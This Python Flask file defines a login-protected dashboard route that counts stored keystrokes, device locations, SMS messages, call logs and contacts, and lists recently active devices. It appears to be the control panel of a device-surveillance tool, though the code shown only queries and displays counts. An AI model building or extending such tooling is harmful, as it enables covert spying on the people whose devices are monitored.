from flask import Blueprint, render_template, request, get_flashed_messages
from user.routes.auth import auth_required
from models.devices import Device, Keystroke, DeviceLocation, SMSMessage, CallLog, Contact
from models.users import User
from datetime import datetime, timedelta

dashboard = Blueprint('dashboard', __name__)


@dashboard.route('/dashboard')
@auth_required
def index():
    alert = get_flashed_messages()
    if len(alert) > 0:
        alert = alert[0]

    online_cutoff = datetime.now() - timedelta(hours=1)
    stats = {
        'total_devices': Device.query.count(),
        'online_devices': Device.query.filter(Device.last_seen >= online_cutoff).count(),
        'total_keystrokes': Keystroke.query.count(),
        'total_locations': DeviceLocation.query.count(),
        'total_sms': SMSMessage.query.count(),
        'total_calls': CallLog.query.count(),
        'total_contacts': Contact.query.count(),
    }
    recent_devices = Device.query.order_by(Device.last_seen.desc()).limit(10).all()

    return render_template('pages/dashboard.html', alert=alert, stats=stats, recent_devices=recent_devices, now=datetime.now())
